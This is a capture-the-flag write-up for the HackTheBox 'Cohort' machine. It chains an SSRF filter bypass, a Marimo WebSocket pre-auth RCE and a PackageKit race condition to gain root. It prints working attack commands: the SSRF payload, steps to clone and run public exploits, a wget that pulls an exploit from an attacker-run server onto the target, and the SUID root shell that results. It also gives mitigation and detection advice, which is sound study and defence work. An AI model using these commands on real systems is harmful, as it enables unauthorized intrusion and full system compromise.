# Cohort

| Field | Value |
|---|---|
| Author | @black |
| Platform | HackTheBox |
| Category & Difficulty | Web, Medium |
| Status | Retired / Live |
| Date | 2026-11-08 |
| Skills exercised | SSRF filter bypass, vhost discovery via config leak, WebSocket RCE, Linux privesc, TOCTOU race conditions |

## TL;DR

`cohort.htb` exposed a URL-validation endpoint vulnerable to SSRF. Using the `127.1` shorthand to bypass the filter, I leaked the nginx status config and discovered an internal Marimo notebook vhost. Marimo `< 0.23.0` is vulnerable to **CVE-2026-39987** (pre-auth RCE via the WebSocket terminal), which yielded a `marimo` shell and the user flag. From there, **CVE-2026-41651** — a TOCTOU race in PackageKit — allowed a malicious `.deb` to be installed as root, dropping a root-owned SUID bash into `/var/tmp` and giving the root flag.

## Reconnaissance & Enumeration

- `nmap -sCV --top-ports 1000 --min-rate 3000 10.129.244.174` → ports **22 (SSH)**, **80 (HTTP)**, **443 (HTTPS)**. Only `cohort.htb` answered, so I added it to `/etc/hosts`.
- The web app exposed a marketing page at `/` and, notably, a `POST /api/validate` endpoint that fetches arbitrary URLs ("Source reachable." in responses). **That's an SSRF smell.**
- Confirmed SSRF with a same-host fetch using the `127.1` shorthand:
  ```bash
  curl -sk https://cohort.htb/api/validate -X POST \
    -H 'Content-Type: application/json' \
    -d '{"url":"http://127.1/","format":"JSON"}'
  ```
  → `{"ok": true, "fetched_status": 200, ...}` — filter bypassed.
- Fetched `http://127.1/status`, which returned the nginx config:
  ```json
  {"service":"cohort-edge","upstreams":[
    {"name":"marketing","host":"cohort.htb"},
    {"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},
    {"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888",
     "note":"internal analyst workspace, not for external use"}
  ]}
  ```
  → This is the pivot. There's an internal-only Marimo notebook at `nb-1be3782a8afd3ad5.cohort.htb`.

> **Dead end:** brute-forcing paths on `cohort.htb` itself returned the SPA shell for everything (client-side router). The real directory listing wasn't there — the config leak was the only way in.

## Vulnerability Analysis

**Identified:** Two separate CVEs chained.

**1. CVE-2026-39987 — Marimo `< 0.23.0` pre-auth RCE (CVSS 9.3).**
The `/terminal/ws` WebSocket endpoint spawns a shell for **unauthenticated** clients. The internal vhost `nb-1be3782a8afd3ad5.cohort.htb` proxies to `127.0.0.1:8888`, and nginx does **not** require auth for the vhost — the SSRF just revealed the hostname; hitting it directly with the right `Host` header works.

**2. CVE-2026-41651 — PackageKit TOCTOU (Pack2TheRoot).**
PackageKit's `InstallFiles` accepts a package path, then re-verifies it later. If the attacker swaps a benign `.deb` for a malicious one between the check and the install, the malicious one is installed **as root**. Precondition: local unprivileged code execution (which we have as `marimo`).

**Confirmed manually:**
- Marimo: connected to `wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws` and immediately received a `marimo@cohort:~$` banner — no auth prompt. That's the pre-auth RCE.
- PackageKit: verified the SUID drop directory mattered — see *Exploitation* below.

## Exploitation & Post-Exploitation

1. **SSRF → vhost discovery.** `127.1` bypassed the SSRF filter's block list, and `/status` leaked the internal hostname. This is the whole reason the box is solvable — without the config leak you're brute-forcing vhosts blind.

2. **Marimo WebSocket RCE (CVE-2026-39987).** The generic PoCs (`M3PH1569`, one-liner `websocket-client` variants) had two problems:
   - They send the reverse-shell payload **before the PTY finishes spawning**, so the payload gets eaten. Fix: drain the initial banner, *then* send.
   - `M3PH1569` expects `http://host`, not `wss://`, and needs a venv on Kali (`externally-managed-environment` error otherwise).

   The reliable path was the machine-specific script from `iapetus12/cohort-htb`:
   ```bash
   git clone https://github.com/iapetus12/cohort-htb.git
   cd cohort-htb
   python3 -m venv .venv && source .venv/bin/activate
   pip install websocket-client
   python3 scripts/marimo_shell.py 10.129.244.174
   ```
   This gives a **persistent interactive `marimo` shell** over the WebSocket — no `nc` listener needed, no dropped connections.

   **Note on the shell:** the WebSocket terminal has bracketed paste enabled, so pasted commands appear as `^[[200~ ... ^[[201~`. Fix with `printf '\e[?2004l'` or `bind 'set enable-bracketed-paste off'`. It's cosmetic, but earlier I mangled commands (`cp /bin/bash /tmpcp /bin/bash /tmp/...`) by not disabling it.

3. **User flag.**
   ```bash
   cat /home/marimo/user.txt
   ```

4. **Privesc (CVE-2026-41651).** Tried three exploits. Only one worked, and the *failure mode* of the others is instructive:

   - **`cve-2026-41651_gio.py` (from `iapetus12`)** — reported `[+] SUCCESS: SUID bash at /tmp/.suid_bash`, but `ls -l` showed:
     ```
     -rwsr-xr-x 1 marimo marimo ... /tmp/.suid_bash
     ```
     **Owner was `marimo`, not `root`.** The `s` bit was cosmetic. Running `/tmp/.suid_bash -p -c 'cat /root/root.txt'` → `Permission denied`. **Lesson: `SUCCESS` means nothing; always verify ownership with `ls -l`.**
   - **`gbuyssens/CVE-2026-41651/exploit.py`** — same result. Also created a marimo-owned SUID (or overwrote with one; my earlier manual `cp /bin/bash /tmp/.suid_bash` was still in the way).
   - **`0xBlackash/CVE-2026-41651`** — ✅ worked on first try. This one **defaults to `/var/tmp`, not `/tmp`**, and explicitly checks for `nosuid`/`noexec` mounts. It also `exec`s you into the root shell directly.

     ```bash
     # On Kali
     git clone https://github.com/0xBlackash/CVE-2026-41651.git
     cp CVE-2026-41651/CVE-2026-41651.py ~/Downloads/serve/
     cd ~/Downloads/serve && python3 -m http.server 8000

     # On target (marimo shell)
     wget http://10.10.15.78:8000/CVE-2026-41651.py
     python3 CVE-2026-41651.py
     ```
     Output ended with:
     ```
     [+] SUID drop directory: /var/tmp  (no nosuid/noexec)
     [+] Confirmed: /var/tmp/.suid_bash is SUID root (mode=0o104755)
     .suid_bash-5.2#
     ```
     **`/var/tmp` vs `/tmp` was the whole difference.** My earlier `rm -f /var/tmp/.suid_bash` returned `Operation not permitted` — a small hint that a **root-owned** file already existed there from a previous run, which the earlier exploits had never managed to produce.

5. **Root flag.**
   ```bash
   .suid_bash-5.2# cat /root/root.txt
   ```

## Flag

- User: — `/home/marimo/user.txt`
- Root: — `/root/root.txt`

## Lessons Learned

- **A `SUCCESS` banner is not proof.** The first two PackageKit exploits both printed success while producing a non-privileged SUID binary. Always `ls -l` and check the **owner** columns are `root root`, not just that the `s` bit exists.
- **SUID drop directory matters.** `/tmp` may be `nosuid`/`noexec`. `/var/tmp` is a better default. If an LPE script hardcodes `/tmp`, audit it or switch scripts.
- **Timing beats cleverness.** Every WebSocket RCE I botched failed for the same reason: sending the payload before the PTY spawned. Drain the banner first. This applies to shellshock, websocket terminals, and any interactive RCE.
- **Bracketed paste will bite you.** On any WebSocket-terminal shell, disable it (`bind 'set enable-bracketed-paste off'`) before pasting multi-line commands — otherwise `^[[200~` sequences corrupt your input.

## Mitigation & Detection

- **Fix:**
  - Upgrade **Marimo to ≥ 0.23.0** and require authentication on `/terminal/ws` even for internal-only vhosts.
  - Patch **PackageKit** to close the TOCTOU window (re-hash the package immediately before install, or install from a held fd).
  - Restrict SSRF at `/api/validate` with an allowlist — the `127.1` shorthand should not bypass it.
  - Do not expose `/status` configs to unauthenticated clients.
  - Mount `/tmp`, `/var/tmp` with `nosuid,noexec`.

- **Detect:**
  - **SSRF:** alert on `/api/validate` requests containing `127.1`, `0x7f000001`, decimal IPs, or `[::1]`.
  - **Marimo RCE:** log WebSocket upgrades to `/terminal/ws` with no session cookie.
  - **PackageKit:** `auditd` rule on `execve` from `/var/tmp/*` and on files gaining the SUID bit outside package-managed paths (`chmod u+s` on non-`dpkg` files).
  - **SUID drop:** file-integrity monitoring for SUID files in `/tmp`, `/var/tmp`, `/dev/shm`.
